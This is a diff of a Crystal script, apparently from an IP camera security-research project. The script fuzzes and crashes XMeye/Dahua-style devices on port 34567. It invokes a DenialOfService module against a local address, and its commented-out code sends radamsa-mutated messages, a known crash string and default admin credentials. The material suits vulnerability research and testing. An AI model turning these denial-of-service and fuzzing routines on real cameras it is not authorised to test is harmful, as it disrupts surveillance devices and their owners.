@@ -1,9 +1,7 @@
 require "json"
 require "socket"
 
-require "./magic_fuzzer"
 require "./denial_of_service"
-require "./xmfuzzer"
  
 # xmm = Command::OPTalk.new
 # fuzzer = XMFuzzer.new(xmm.to_s, seed: :test1234.hash.to_i32)
@@ -16,7 +14,7 @@ require "./xmfuzzer"
 # header = "\xFF\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\x9A\u0005*\u0000\u0000\u0000"
 # xmm = XMMessage.from_s header + "\"\"Name\":\"OPTalk\",\"SessionID\":\"0x00000000\"}"
 # pp xmm
-# socket = XMSocket.new("192.168.11.109", 34567)
+# socket = XMSocketTCP.new("192.168.11.109", 34567)
 # #socket.login("admin", Dahua.digest("password"))
 # socket.send_message xmm
 # puts "SENT:"
@@ -25,7 +23,7 @@ require "./xmfuzzer"
 # socket.close
 # end
 
-puts DenialOfService.sandbox("192.168.11.109", command: Command::OPTalk)
+puts DenialOfService.use_size_int("192.168.1.99",34568)
 
 
 
@@ -103,7 +101,7 @@ puts DenialOfService.sandbox("192.168.11.109", command: Command::OPTalk)
 # end
 # File.open("./logs/radamsa/unknown.log", "w+") do |file|
 #   puts "Testing connection"
-#   socket = XMSocket.new("192.168.11.109", 34567)
+#   socket = XMSocketTCP.new("192.168.11.109", 34567)
 #   xmm = Command::Unknown.new
 #   socket.send_message xmm
 #   puts "SENT: #{xmm.message}"
@@ -117,7 +115,7 @@ puts DenialOfService.sandbox("192.168.11.109", command: Command::OPTalk)
 #     print '\n' if counter % 10000 == 0
 #     xmm = Command::Unknown.new
 #     begin
-#       socket = XMSocket.new("192.168.11.109", 34567)
+#       socket = XMSocketTCP.new("192.168.11.109", 34567)
 #       xmm.message = `radamsa ./rsrc/unknown.txt` 
 #       socket.send_message xmm
 #       reply = socket.receive_message
@@ -155,7 +153,7 @@ puts DenialOfService.sandbox("192.168.11.109", command: Command::OPTalk)
 # crash_string = "\"\""
 # puts "SENDING: #{crash_string}"
 
-# socket = XMSocket.new("192.168.11.109", 34567)
+# socket = XMSocketTCP.new("192.168.11.109", 34567)
 # xmm = Command::OPMonitor.new
 # xmm.message = crash_string
 # socket.send_message xmm
@@ -199,7 +197,7 @@ puts DenialOfService.sandbox("192.168.11.109", command: Command::OPTalk)
 
 # xmm = Command::NoName.new
 # PASSWORD = Dahua.digest("password")
-# m = XMSocket.new("192.168.11.109", 34567)
+# m = XMSocketTCP.new("192.168.11.109", 34567)
 # m.login("admin", PASSWORD)
 
 # xmm.magic = 0x0000
